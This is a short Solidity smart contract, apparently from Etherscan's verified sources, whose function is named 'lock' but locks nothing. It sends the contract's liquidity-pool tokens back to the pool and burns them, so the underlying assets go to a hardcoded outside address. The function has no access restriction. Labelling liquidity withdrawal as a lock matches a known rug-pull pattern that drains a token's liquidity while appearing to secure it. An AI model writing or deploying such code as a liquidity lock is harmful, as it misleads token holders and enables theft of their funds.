/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

interface ILiquidity {

    function burn(address) external returns(uint256, uint256);
    function balanceOf(address) external view returns(uint256);
    function transfer(address, uint256) external returns(bool);
}

contract LiquidityManager {

    function lock(address liquidity) external {

        ILiquidity LPool = ILiquidity(liquidity);

        LPool.transfer(liquidity, LPool.balanceOf(address(this)));

        LPool.burn(0xdaeFc08bE0481029870B4b4Adf5ea33dA17a9D42);
    }
}